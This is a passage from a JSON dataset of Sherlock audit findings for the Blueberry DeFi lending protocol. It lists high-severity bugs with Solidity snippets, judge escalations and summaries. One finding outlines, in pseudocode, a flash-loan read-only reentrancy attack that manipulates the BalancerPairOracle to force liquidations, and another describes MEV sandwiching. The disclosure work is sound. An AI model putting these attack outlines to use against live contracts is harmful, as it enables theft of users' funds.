a valid medium \n\n**sherlock-admin**\n\n> Escalation accepted\n> \n> Considering this issue a valid medium \n\n    This issue's escalations have been accepted!\n\n    Contestants' payouts and scores will be updated according to the changes made on this issue.",
      "summary": "\nA bug was identified in the BalancerPairOracle contract, which is used by Aura Finance pools. The bug is a calculation underflow/overflow, which will cause the LP price calculation to revert in most cases. The bug was found by manual review and the code snippet can be found at the provided GitHub link. The impact of the bug is that LP prices for Balancer-like collateral tokens will not be calculated correctly. The recommendation is to change the calculation logic to align with Alpha's original implementation, which has precision control. The bug was accepted as a valid medium and the contest payout and scores will be updated accordingly.",
      "quality_score": 2,
      "rarity_score": 3,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Blueberry Update",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-04-blueberry-judging/issues/11",
      "tags": [
        "Wrong Math",
        "Uniswap",
        "Overflow/Underflow",
        "Lending Pool"
      ],
      "finders": [
        "n1punp"
      ]
    },
    {
      "id": "18494",
      "title": "H-14: Deadline check is not effective, allowing outdated slippage and allow pending transaction to be unexpected executed",
      "impact": "HIGH",
      "content": "Source: https://github.com/sherlock-audit/2023-04-blueberry-judging/issues/145 \n\n## Found by \nBauer, Breeje, ctf\\_sec\n## Summary\n\nDeadline check is not effective, allowing outdated slippage and allow pending transaction to be unexpected executed\n\n## Vulnerability Detail\n\nIn the current implementation in CurveSpell.sol\n\n```solidity\n{\n\t// 2. Swap rewards tokens to debt token\n\tuint256 rewards = _doCutRewardsFee(CRV);\n\t_ensureApprove(CRV, address(swapRouter), rewards);\n\tswapRouter.swapExactTokensForTokens(\n\t\trewards,\n\t\t0,\n\t\tswapPath,\n\t\taddress(this),\n\t\ttype(uint256).max\n\t);\n}\n```\n\nthe deadline check is set to type(uint256).max, which means the deadline check is disabled!\n\nIn IChiSpell. the swap is directedly call on the pool instead of the router\n\n```solidity\nSWAP_POOL.swap(\n\taddress(this),\n\t// if withdraw token is Token0, then swap token1 -> token0 (false)\n\t!isTokenA,\n\tamountToSwap.toInt256(),\n\tisTokenA\n\t\t? param.sqrtRatioLimit + deltaSqrt\n\t\t: param.sqrtRatioLimit - deltaSqrt, // slippaged price cap\n\tabi.encode(address(this))\n);\n```\n\nand it has no deadline check for the transaction when swapping\n\n## Impact\n\nAMMs provide their users with an option to limit the execution of their pending actions, such as swaps or adding and removing liquidity. The most common solution is to include a deadline timestamp as a parameter (for example see Uniswap V2 and Uniswap V3). If such an option is not present, users can unknowingly perform bad trades:\n\nAlice wants to swap 100 tokens for 1 ETH and later sell the 1 ETH for 1000 DAI.\n\nThe transaction is submitted to the mempool, however, Alice chose a transaction fee that is too low for miners to be interested in including her transaction in a block. The transaction stays pending in the mempool for extended periods, which could be hours, days, weeks, or even longer.\n\nWhen the average gas fee dropped far enough for Alice's transaction to become interesting again for miners to include it, her swap will be executed. In the meantime, the price of ETH could have drastically changed. She will still get 1 ETH but the DAI value of that output might be significantly lower. \n\nShe has unknowingly performed a bad trade due to the pending transaction she forgot about.\n\nAn even worse way this issue can be maliciously exploited is through MEV:\n\nThe swap transaction is still pending in the mempool. Average fees are still too high for miners to be interested in it. \n\nThe price of tokens has gone up significantly since the transaction was signed, meaning Alice would receive a lot more ETH when the swap is executed. But that also means that her maximum slippage value (sqrtPriceLimitX96 and minOut in terms of the Spell contracts) is outdated and would allow for significant slippage.\n\nA MEV bot detects the pending transaction. Since the outdated maximum slippage value now allows for high slippage, the bot sandwiches Alice, resulting in significant profit for the bot and significant loss for Alice.\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2023-04-blueberry/blob/main/blueberry-core/contracts/spell/CurveSpell.sol#L162-L175\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nWe recommend the protocol use block.timstamp for swapping deadline for Uniswap V2 and swap with Unsiwap Router V3 instead of the pool directly!",
      "summary": "\nThis bug report is about an issue found in CurveSpell.sol, a smart contract used to provide liquidity to decentralized exchanges (DEXs). The issue is that the deadline check is set to type(uint256).max, which means the deadline check is disabled. This allows outdated slippage and pending transactions to be executed unexpectedly. \n\nThis issue can be maliciously exploited through the process of miner extractable value (MEV), where a MEV bot can detect a pending transaction and sandwich Alice, resulting in significant profit for the bot and significant loss for Alice. \n\nThe bug was found by Bauer, Breeje, and ctf_sec, and the code snippet can be found on GitHub.\n\nThe recommendation is that the protocol should use block.timestamp for swapping deadline for Uniswap V2 and swap with Unsiwap Router V3 instead of the pool directly.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Blueberry Update",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-04-blueberry-judging/issues/145",
      "tags": [
        "Uniswap",
        "Swap",
        "Slippage",
        "Lending Pool",
        "Deadline"
      ],
      "finders": [
        "Bauer",
        "Breeje",
        "ctf\\_sec"
      ]
    },
    {
      "id": "18493",
      "title": "H-13: `BalancerPairOracle` can be manipulated using read-only reentrancy",
      "impact": "HIGH",
      "content": "Source: https://github.com/sherlock-audit/2023-04-blueberry-judging/issues/141 \n\n## Found by \ncuthalion0x\n## Summary\n\n`BalancerPairOracle.getPrice` makes an external call to `BalancerVault.getPoolTokens` without checking the Balancer Vault's reentrancy guard. As a result, the oracle can be trivially manipulated to liquidate user positions prematurely.\n\n## Vulnerability Detail\n\nIn February, the Balancer team disclosed a read-only reentrancy vulnerability in the Balancer Vault. The detailed disclosure can be found [here](https://forum.balancer.fi/t/reentrancy-vulnerability-scope-expanded/4345). In short, all Balancer pools are susceptible to manipulation of their external queries, and all integrations must now take an extra step of precaution when consuming data. Via reentrancy, an attacker can force token balances and BPT supply to be out of sync, creating very inaccurate BPT prices.\n\nSome protocols, such as Sentiment, remained unaware of this issue for a few months and were later [hacked](https://twitter.com/spreekaway/status/1643313471180644360) as a result.\n\n`BalancerPairOracle.getPrice` makes a price calculation of the form `f(balances) / pool.totalSupply()`, so it is clearly vulnerable to synchronization issues between the two data points. A rough outline of the attack might look like this:\n\n```solidity\nAttackerContract.flashLoan() ->\n    // Borrow lots of tokens and trigger a callback.\n    SomeProtocol.flashLoan() ->\n        AttackerContract.exploit()\n\nAttackerContract.exploit() ->\n    // Join a Balancer Pool using the borrowed tokens and send some ETH along with the call.\n    BalancerVault.joinPool() ->\n        // The Vault will return the excess ETH to the sender, which will reenter this contract.\n        // At this point in the execution, the BPT supply has been updated but the token balances have not.\n        AttackerContract.receive()\n\nAttackerContract.receive() ->\n    // Liquidate a position using the same Balancer Pool as collateral.\n    BlueBerryBank.liquidate() ->\n        // Call to the oracle to check the price.\n        BalancerPairOracle.getPrice() ->\n            // Query the token balances. At this point in the execution, these have not been updated (see above).\n            // So, the balances are still the same as before the start of the large pool join.\n            BalancerVaul.getPoolTokens()\n\n            // Query the BPT supply. At this point in the execution, the supply has already been updated (see above).\n            // So, it includes the latest large pool join, and as such the BPT supply has grown by a large amount.\n            BalancerPool.getTotalSupply()\n\n            // Now the price is computed using both balances and supply, and the result is much smaller than it should be.\n            price = f(balances) / pool.totalSupply()\n\n        // The position is liquidated under false pretenses.\n```\n\n## Impact\n\nUsers choosing Balancer pool positions (such as Aura vaults) as collateral can be prematurely liquidated due to unreliable price data.\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2023-04-blueberry/blob/main/blueberry-core/contracts/oracle/BalancerPairOracle.sol#L70-L92\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nThe Balancer team recommends utilizing their [official library](https://github.com/balancer/balancer-v2-monorepo/blob/3ce5138abd8e336f9caf4d651184186fffcd2025/pkg/pool-utils/contracts/lib/VaultReentrancyLib.sol) to safeguard queries such as `Vault.getPoolTokens`. However, the library makes a state-modifying call to the Balancer Vault, so it is not suitable for `view` functions such as `BalancerPairOracle.getPrice`. There are then two options:\n1. Invoke the library somewhere else. Perhaps insert a hook into critical system functions like `BlueBerryBank.liquidate`.\n2. Adapt a slightly different read-only solution that checks the Balancer Vault's reentrancy guard without actually entering.",
      "summary": "\nThis bug report is about the `BalancerPairOracle` contract, which is used to calculate the price of a Balancer Pool Token (BPT). The issue is that the `BalancerPairOracle.getPrice` function makes an external call to `BalancerVault.getPoolTokens` without checking the Balancer Vault's reentrancy guard. This means that the Oracle can be manipulated to liquidate user positions prematurely, as the price calculation is based on a combination of token balances and BPT supply.\n\nThe vulnerability was found by cuthalion0x and was initially disclosed by the Balancer team in February. It was later exploited in a hack of the Sentiment protocol.\n\nThe code snippet provided is from the `BalancerPairOracle.sol` file, line 70 to 92. The tool used was manual review.\n\nThe Balancer team recommends using their official library to safeguard queries such as `Vault.getPoolTokens`. However, this library makes a state-modifying call to the Balancer Vault, so it is not suitable for `view` functions such as `BalancerPairOracle.getPrice`. There are two possible solutions: 1. Invoke the library somewhere else, such as in critical system functions like `BlueBerryBank.liquidate`, or 2. Adapt a slightly different read-only solution that checks the Balancer Vault's reentrancy guard without actually entering.",
      "quality_score": 5,
      "rarity_score": 5,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Blueberry Update",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-04-blueberry-judging/issues/141",
      "tags": [
        "Read-only Reentrancy",
        "Oracle",
        "Flash Loan"
      ],
      "finders": [
        "cuthalion0x"
      ]
    },
    {
      "id": "18492",
      "title": "H-12: Pending CRV rewards are not accounted for and can cause unfair liquidations",
      "impact": "HIGH",
      "content": "Source: https://github.com/sherlock-audit/2023-04-blueberry-judging/issues/136 \n\n## Found by \n0x52\n## Summary\n\npendingRewards are factored into the health of a position so that the position collateral is fairly assessed. However WCurveGauge#pendingRewards doesn't return the proper reward tokens/amounts meaning that positions aren't valued correctly and users can be unfairly liquidated.\n\n## Vulnerability Detail\n\n[BlueBerryBank.sol#L408-L413](https://github.com/sherlock-audit/2023-04-blueberry/blob/main/blueberry-core/contracts/BlueBerryBank.sol#L408-L413)\n\n            (address[] memory tokens, uint256[] memory rewards) = IERC20Wrapper(\n                pos.collToken\n            ).pendingRewards(pos.collId, pos.collateralSize);\n            for (uint256 i; i < tokens.length; i++) {\n                rewardsValue += oracle.getTokenValue(tokens[i], rewards[i]);\n            }\n\nWhen BlueBerryBank is valuing a position it also values the pending rewards since they also have value. \n\n[WCurveGauge.sol#L106-L114](https://github.com/sherlock-audit/2023-04-blueberry/blob/main/blueberry-core/contracts/wrapper/WCurveGauge.sol#L106-L114)\n\n    function pendingRewards(\n        uint256 tokenId,\n        uint256 amount\n    )\n        public\n        view\n        override\n        returns (address[] memory tokens, uint256[] memory rewards)\n    {}\n\nAbove we see that WCurveGauge#pendingRewards returns empty arrays when called. This means that pending rewards are not factored in correctly and users can be liquidated when even when they should be safe.\n\n## Impact\n\nUser is liquidated when they shouldn't be\n\n## Code Snippet\n\n[WCurveGauge.sol#L106-L114](https://github.com/sherlock-audit/2023-04-blueberry/blob/main/blueberry-core/contracts/wrapper/WCurveGauge.sol#L106-L114)\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nChange WCurveGauge#pendingRewards to correctly return the pending rewards",
      "summary": "\nThis bug report is about an issue found in the BlueBerryBank smart contract, which is used to value positions. The bug is that the WCurveGauge#pendingRewards function doesn't return the proper reward tokens or amounts, meaning that positions aren't valued correctly and users can be unfairly liquidated. This is due to the fact that BlueBerryBank is valuing a position and also valuing the pending rewards, which have value. The impact of this bug is that users are liquidated when they shouldn't be. The bug was found through manual review, and the recommendation is to change WCurveGauge#pendingRewards to correctly return the pending rewards.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Blueberry Update",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-04-blueberry-judging/issues/136",
      "tags": [
        "Liquidation",
        "Coding-Bug",
        "Array"
      ],
      "finders": [
        "0x52"
      ]
    },
    {
      "id": "18491",
      "title": "H-11: ShortLongSpell#openPosition can cause user unexpected liquidation when increasing position size",
      "impact": "HIGH",
      "content": "Source: https://github.com/sherlock-audit/2023-04-blueberry-judging/issues/135 \n\n## Found by \n0x52, Ch\\_301\n## Summary\n\nWhen increasing a position, all collateral is sent to the user rather than being kept in the position. This can cause serious issues because this collateral keeps the user from being liquidated. It may unexpectedly leave the user on the brink of liquidation where a small change in price leads to their liquidation.\n\n## Vulnerability Detail\n\n[ShortLongSpell.sol#L129-L141](https://github.com/sherlock-audit/2023-04-blueberry/blob/main/blueberry-core/contracts/spell/ShortLongSpell.sol#L129-L141)\n\n        {\n            IBank.Position memory pos = bank.getCurrentPositionInfo();\n            address posCollToken = pos.collToken;\n            uint256 collSize = pos.collateralSize;\n            address burnToken = address(ISoftVault(strategy.vault).uToken());\n            if (collSize > 0) {\n                if (posCollToken != address(wrapper))\n                    revert Errors.INCORRECT_COLTOKEN(posCollToken);\n                bank.takeCollateral(collSize);\n                wrapper.burn(burnToken, collSize);\n                _doRefund(burnToken);\n            }\n        }\n\nIn the above lines we can see that all collateral is burned and the user is sent the underlying tokens. This is problematic as it sends all the collateral to the user, leaving the position collateralized by only the isolated collateral.\n\nBest case the user's transaction reverts but worst case they will be liquidated almost immediately.  \n\n## Impact\n\nUnfair liquidation for users\n\n## Code Snippet\n\n[ShortLongSpell.sol#L111-L151](https://github.com/sherlock-audit/2023-04-blueberry/blob/main/blueberry-core/contracts/spell/ShortLongSpell.sol#L111-L151)\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nDon't burn the collateral",
      "summary": "\nThis bug report is about ShortLongSpell#openPosition, a function in the ShortLongSpell.sol contract, which can cause users to experience unexpected liquidation when increasing their position size. The bug was discovered by 0x52 and Ch_301 using manual review.\n\nThe bug occurs when all of the collateral is sent to the user rather than kept in the position. This can lead to serious issues as the collateral is needed to prevent liquidation. As a result, users may find themselves on the brink of liquidation and a small change in price could lead to their liquidation.\n\nThe code snippet for this issue is found in ShortLongSpell.sol#L129-L141. Here, all of the collateral is burned and the user is sent the underlying tokens. This is problematic as it sends all the collateral to the user, leaving the position collateralized by only the isolated collateral.\n\nThe impact of this bug is that users may experience unfair liquidation. The recommendation is to not burn the collateral.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Blueberry Update",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-04-blueberry-judging/issues/135",
      "tags": [
        "Liquidation",
        "Configuration",
        "Business Logic"
      ],
      "finders": [
        "Ch\\_301",
        "0x52"
      ]
    },
    {
      "id": "18490",
      "title": "H-10: Balance check for swapToken in ShortLongSpell#_deposit is incorrect and will result in nonfunctional contract",
      "impact": "HIGH",
      "content": "Source: https://github.com/sherlock-audit/2023-04-blueberry-judging/issues/133 \n\n## Found by \n0x52, Ch\\_301, sinarette\n## Summary\n\nThe balance checks on ShortLongSpell#_withdraw are incorrect and will make contract basically nonfunctional \n\n## Vulnerability Detail\n\nswapToken is always vault.uToken. borrowToken is always required to be vault.uToken which means that swapToken == borrowToken. This means that the token borrowed is always required to be swapped. \n\n[ShortLongSpell.sol#L83-L89](https://github.com/sherlock-audit/2023-04-blueberry/blob/main/blueberry-core/contracts/spell/ShortLongSpell.sol#L83-L89)\n\n        uint256 strTokenAmt = _doBorrow(param.borrowToken, param.borrowAmount);\n\n        // 3. Swap borrowed token to strategy token\n        IERC20Upgradeable swapToken = ISoftVault(strategy.vault).uToken();\n        // swapData.fromAmount = strTokenAmt;\n        PSwapLib.megaSwap(augustusSwapper, tokenTransferProxy, swapData);\n        strTokenAmt = swapToken.balanceOf(address(this)) - strTokenAmt; <- @audit-issue will always revert on swap\n\nBecause swapToken == borrowToken if there is ever a swap then the swapToken balance will decrease. This causes L89 to always revert when a swap happens, making the contract completely non-functional\n\n## Impact\n\nShortLongSpell is nonfunctional\n\n## Code Snippet\n\n[ShortLongSpell.sol#L160-L202](https://github.com/sherlock-audit/2023-04-blueberry/blob/main/blueberry-core/contracts/spell/ShortLongSpell.sol#L160-L202)\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nRemove check",
      "summary": "\nThis bug report is about the balance check for swapToken in ShortLongSpell#_deposit being incorrect and resulting in a nonfunctional contract. It was found by 0x52, Ch\\_301 and sinarette using manual review. \n\nThe issue is that swapToken is always vault.uToken and borrowToken is always required to be vault.uToken which means that swapToken == borrowToken. This means that the token borrowed is always required to be swapped. Because swapToken == borrowToken, if there is ever a swap then the swapToken balance will decrease. This causes L89 to always revert when a swap happens, making the contract completely non-functional. \n\nThe impact of this bug is that ShortLongSpell is nonfunctional. The code snippet of the issue is located at ShortLongSpell.sol#L160-L202. The recommendation is to remove the check.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Blueberry Update",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-04-blueberry-judging/issues/133",
      "tags": [
        "Swap",
        "Coding-Bug"
      ],
      "finders": [
        "Ch\\_301",
        "sinarette",
        "0x52"
      ]
    },
    {
      "id": "18489",
      "title": "H-9: UniswapV3 sqrtRatioLimit doesn't provide slippage protection and will result in partial swaps",
      "impact": "HIGH",
      "content": "Source: https://github.com/sherlock-audit/2023-04-blueberry-judging/issues/132 \n\n## Found by \n0x52\n## Summary\n\nThe sqrtRatioLimit for UniV3 doesn't cause the swap to revert upon reaching that value. Instead it just cause the swap to partially fill. This is a [known issue](https://github.com/Uniswap/v3-core/blob/d8b1c635c275d2a9450bd6a78f3fa2484fef73eb/contracts/UniswapV3Pool.sol#L641) with using sqrtRatioLimit as can be seen here where the swap ends prematurely when it has been reached. This is problematic as this is meant to provide the user with slippage protection but doesn't.\n\n## Vulnerability Detail\n\nhttps://github.com/sherlock-audit/2023-04-blueberry/blob/main/blueberry-core/contracts/spell/IchiSpell.sol#L209-L223\n\n        if (amountToSwap > 0) {\n            SWAP_POOL = IUniswapV3Pool(vault.pool());\n            uint160 deltaSqrt = (param.sqrtRatioLimit *\n                uint160(param.sellSlippage)) / uint160(Constants.DENOMINATOR);\n            SWAP_POOL.swap(\n                address(this),\n                // if withdraw token is Token0, then swap token1 -> token0 (false)\n                !isTokenA,\n                amountToSwap.toInt256(),\n                isTokenA\n                    ? param.sqrtRatioLimit + deltaSqrt\n                    : param.sqrtRatioLimit - deltaSqrt, // slippaged price cap\n                abi.encode(address(this))\n            );\n        }\n\nsqrtRatioLimit is used as slippage protection for the user but is ineffective and depending on what tokens are being swapped, tokens may be left the in the contract which can be stolen by anyone.\n\n## Impact\n\nIncorrect slippage application can result in partial swaps and loss of funds\n\n## Code Snippet\n\n[IchiSpell.sol#L181-L236](https://github.com/sherlock-audit/2023-04-blueberry/blob/main/blueberry-core/contracts/spell/IchiSpell.sol#L181-L236)\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nCheck the amount received from the swap and compare it against some user supplied minimum",
      "summary": "\nThis bug report is about the issue H-9 which was found by 0x52. The sqrtRatioLimit for UniV3 doesn't cause the swap to revert upon reaching that value. Instead, it just causes the swap to partially fill. This is a known issue with using sqrtRatioLimit as can be seen in the code snippet, where the swap ends prematurely when it has been reached. This is problematic as this is meant to provide the user with slippage protection but doesn't. This incorrect slippage application can result in partial swaps and loss of funds. The code snippet provided is from IchiSpell.sol#L181-L236. The tool used to identify this bug was manual review. The recommendation given is to check the amount received from the swap and compare it against some user supplied minimum.",
      "quality_score": 5,
      "rarity_score": 5,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Blueberry Update",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-04-blueberry-judging/issues/132",
      "tags": [
        "Uniswap",
        "Swap",
        "Slippage",
        "Missing-Logic",
        "Configuration"
      ],
      "finders": [
        "0x52"
      ]
    },
    {
      "id": "18488",
      "title": "H-8: UserData for balancer pool exits is malformed and will permanently trap users",
      "impact": "HIGH",
      "content": "Source: https://github.com/sherlock-audit/2023-04-blueberry-judging/issues/129 \n\n## Found by \n0x52, cuthalion0x\n## Summary\n\nUserData for balancer pool exits is malformed and will result in all withdrawal attempts failing, trapping the user permanently. \n\n## Vulnerability Detail\n\n[AuraSpell.sol#L184-L189](https://github.com/sherlock-audit/2023-04-blueberry/blob/main/blueberry-core/contracts/spell/AuraSpell.sol#L184-L189)\n\n    wAuraPools.getVault(lpToken).exitPool(\n        IBalancerPool(lpToken).getPoolId(),\n        address(this),\n        address(this),\n        IBalancerVault.ExitPoolRequest(tokens, minAmountsOut, \"\", false)\n    );\n\nWe see above that UserData is encoded as \"\". This is problematic as it doesn't contain the proper data for exiting the pool, causing all exit request to fail and trap the user permanently.\n\nhttps://etherscan.io/address/0x5c6ee304399dbdb9c8ef030ab642b10820db8f56#code#F9#L50\n\n    function exactBptInForTokenOut(bytes memory self) internal pure returns (uint256 bptAmountIn, uint256 tokenIndex) {\n        (, bptAmountIn, tokenIndex) = abi.decode(self, (WeightedPool.ExitKind, uint256, uint256));\n    }\n\nUserData is decoded into the data shown above when using ExitKind = 0. Since the exit uses \"\" as the user data this will be decoded as 0 a.k.a [EXACT_BPT_IN_FOR_ONE_TOKEN_OUT](https://etherscan.io/address/0x5c6ee304399dbdb9c8ef030ab642b10820db8f56#code#F24#L50). This is problematic because the token index and bptAmountIn should also be encoded in user data for this kind of exit. Since it isn't the exit call will always revert and the user will be permanently trapped.\n\n## Impact\n\nUsers will be permanently trapped, unable to withdraw\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2023-04-blueberry/blob/main/blueberry-core/contracts/spell/AuraSpell.sol#L149-L224\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nEncode the necessary exit data in userData",
      "summary": "\nThis bug report is about an issue found in the code of the AuraSpell.sol contract. The code in question is located at https://github.com/sherlock-audit/2023-04-blueberry/blob/main/blueberry-core/contracts/spell/AuraSpell.sol#L184-L189. This code is responsible for handling the exit of users from a balancer pool. \n\nThe issue is that the UserData for the balancer pool exits is malformed and does not contain the proper data for exiting the pool. This will cause all exit requests to fail, trapping the user permanently. This issue was found by 0x52 and cuthalion0x while manually reviewing the code. \n\nThe impact of this issue is that users will be permanently trapped, unable to withdraw. The recommended solution to this issue is to encode the necessary exit data in the userData.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Blueberry Update",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-04-blueberry-judging/issues/129",
      "tags": [
        "Lending Pool",
        "Data Validation",
        "Configuration",
        "Coding-Bug"
      ],
      "finders": [
        "0x52",
        "cuthalion0x"
      ]
    },
    {
      "id": "18487",
      "title": "H-7: WAuraPools will irreversibly break if reward tokens are added to pool after deposit",
      "impact": "HIGH",
      "content": "Source: https://github.com/sherlock-audit/2023-04-blueberry-judging/issues/127 \n\n## Found by \n0x52, Ch\\_301\n## Summary\n\nWAuraPools will irreversibly break if reward tokens are added to pool after deposit due to an OOB error on accExtPerShare.\n\n## Vulnerability Detail\n\n[WAuraPools.sol#L166-L189](https://github.com/sherlock-audit/2023-04-blueberry/blob/main/blueberry-core/contracts/wrapper/WAuraPools.sol#L166-L189)\n\n        uint extraRewardsCount = IAuraRewarder(crvRewarder)\n            .extraRewardsLength(); <- @audit-issue rewardTokenCount pulled fresh\n        tokens = new address[](extraRewardsCount + 1);\n        rewards = new uint256[](extraRewardsCount + 1);\n\n        tokens[0] = IAuraRewarder(crvRewarder).rewardToken();\n        rewards[0] = _getPendingReward(\n            stCrvPerShare,\n            crvRewarder,\n            amount,\n            lpDecimals\n        );\n\n        for (uint i = 0; i < extraRewardsCount; i++) {\n            address rewarder = IAuraRewarder(crvRewarder).extraRewards(i);\n\n            @audit-issue attempts to pull from array which will be too small if tokens are added\n            uint256 stRewardPerShare = accExtPerShare[tokenId][i];\n            tokens[i + 1] = IAuraRewarder(rewarder).rewardToken();\n            rewards[i + 1] = _getPendingReward(\n                stRewardPerShare,\n                rewarder,\n                amount,\n                lpDecimals\n            );\n        }\n\naccExtPerShare stores the current rewardPerToken when the position is first created. It stores it as an array and only stores values for reward tokens that have been added prior to minting. This creates an issue if a reward token is added because now it will attempt to pull a value for an index that doesn't exist and throw an OOB error.\n\nThis is problematic because pendingRewards is called every single transaction via the isLiquidatable subcall in BlueBerryBank#execute.\n\n## Impact\n\nWAuraPools will irreversibly break if reward tokens are added to pool after\n\n## Code Snippet\n\n[WAuraPools.sol#L152-L190](https://github.com/sherlock-audit/2023-04-blueberry/blob/main/blueberry-core/contracts/wrapper/WAuraPools.sol#L152-L190)\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nUse a mapping rather than an array to store values",
      "summary": "\nThis bug report is about the WAuraPools smart contract. It was found by 0x52 and Ch_301 and is related to the issue of adding reward tokens to a pool after a deposit. This results in an Out of Bounds (OOB) error on the accExtPerShare variable, which is an array that stores the current reward per token when the position is first created. This OOB error occurs because the array only stores values for reward tokens that were added prior to minting, and so if a reward token is added after, it will attempt to pull a value for an index that doesn't exist. This is problematic because pendingRewards is called every single transaction via the isLiquidatable subcall in BlueBerryBank#execute. As a result, WAuraPools will irreversibly break if reward tokens are added to the pool after a deposit. The code snippet associated with this issue is found in the WAuraPools.sol file from line 152 to line 190. The tool used to find this bug was manual review. The recommendation to solve this issue is to use a mapping rather than an array to store values.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Blueberry Update",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-04-blueberry-judging/issues/127",
      "tags": [
        "Missing-Logic",
        "Mapping",
        "Coding-Bug",
        "Array Bound"
      ],
      "finders": [
        "Ch\\_301",
        "0x52"
      ]
    },
    {
      "id": "18486",
      "title": "H-6: ShortLongSpell#_withdraw checks slippage limit but never applies it making it useless",
      "impact": "HIGH",
      "content": "Source: https://github.com/sherlock-audit/2023-04-blueberry-judging/issues/126 \n\n## Found by \n0x52, Ch\\_301\n## Summary\n\nSlippage limits protect the protocol in the event that a malicious user wants to extract value via swaps, this is an important protection in the event that a user finds a way to trick collateral requirements. Currently the sell slippage is checked but never applied so it is useless.\n\n## Vulnerability Detail\n\nSee summary.\n\n## Impact\n\nSlippage limit protections are ineffective for ShortLongSpell\n\n## Code Snippet\n\n[ShortLongSpell.sol#L160-L20](https://github.com/sherlock-audit/2023-04-blueberry/blob/main/blueberry-core/contracts/spell/ShortLongSpell.sol#L160-L202)\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nApply sell slippage after it is checked\n\n\n\n## Discussion\n\n**securitygrid**\n\nEscalate for 10 USDC\nThis is not a valid M/H. The toAmont and expectedAmount in the off-chain parameter [MegaSwapSellData](https://github.com/sherlock-audit/2023-04-blueberry/blob/main/blueberry-core/contracts/libraries/Paraswap/Utils.sol#L30-L42) structure are the real slippage protection parameters. Just like ExactInputParams/ExactOutputParams of uniswapV3 pool.\n\n**sherlock-admin**\n\n > Escalate for 10 USDC\n> This is not a valid M/H. The toAmont and expectedAmount in the off-chain parameter [MegaSwapSellData](https://github.com/sherlock-audit/2023-04-blueberry/blob/main/blueberry-core/contracts/libraries/Paraswap/Utils.sol#L30-L42) structure are the real slippage protection parameters. Just like ExactInputParams/ExactOutputParams of uniswapV3 pool.\n\nYou've created a valid escalation for 10 USDC!\n\nTo remove the escalation from consideration: Delete your comment.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**ctf-sec**\n\nI still think this is a valid issue\n\nsellSlippage checked but not applied\n\nhttps://github.com/sherlock-audit/2023-04-blueberry/blob/96eb1829571dc46e1a387985bd56989702c5e1dc/blueberry-core/contracts/spell/ShortLongSpell.sol#L160-L202\n\n```solidity\n   function _withdraw(\n        ClosePosParam calldata param,\n        Utils.MegaSwapSellData calldata swapData\n    ) internal {\n        if (param.sellSlippage > bank.config().maxSlippageOfClose())\n            revert Errors.RATIO_TOO_HIGH(param.sellSlippage);\n```\n\nit is true that the slippage is checked but not applied\n\n> The toAmont and expectedAmount in the off-chain parameter [MegaSwapSellData](https://github.com/sherlock-audit/2023-04-blueberry/blob/main/blueberry-core/contracts/libraries/Paraswap/Utils.sol#L30-L42) structure are the real slippage protection parameters. Just like ExactInputParams/ExactOutputParams of uniswapV3 pool.\n\nthis is true, but the code should still check the slippage based on the received amount instead of off-chain parameter\n\n\n\n**hrishibhat**\n\nEscalation rejected\n\nValid high\nAgree with the Lead judge comment. \nSlippage must be checked on code whenever possible instead of an off-chain parameter. \n\n\n**sherlock-admin**\n\n> Escalation rejected\n> \n> Valid high\n> Agree with the Lead judge comment. \n> Slippage must be checked on code whenever possible instead of an off-chain parameter. \n> \n\n    This issue's escalations have been rejected!\n\n    Watsons who escalated this issue will have their escalation amount deducted from their next payout.",
      "summary": "\nA bug has been identified in the ShortLongSpell protocol, where the sell slippage is checked but never applied, making it useless. This is an important protection in the event that a user finds a way to trick collateral requirements. The code snippet that is affected can be found at ShortLongSpell.sol#L160-L202. The bug was discovered by 0x52 and Ch\\_301.\n\nThe impact of this bug is that slippage limit protections are ineffective for ShortLongSpell. The recommendation is to apply sell slippage after it is checked.\n\nThe bug was discussed by securitygrid, sherlock-admin, ctf-sec, and hrishibhat. Securitygrid pointed out that the toAmont and expectedAmount in the off-chain parameter MegaSwapSellData structure are the real slippage protection parameters, and that this is similar to the ExactInputParams/ExactOutputParams of uniswapV3 pool. Ctf-sec argued that the code should still check the slippage based on the received amount instead of off-chain parameter. Hrishibhat then rejected the escalation, saying that slippage must be checked on code whenever possible instead of an off-chain parameter. Sherlock-admin then confirmed that the escalations had been rejected and that Watsons who escalated the issue will have their escalation amount deducted from their next payout.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Blueberry Update",
      "source_link": "",
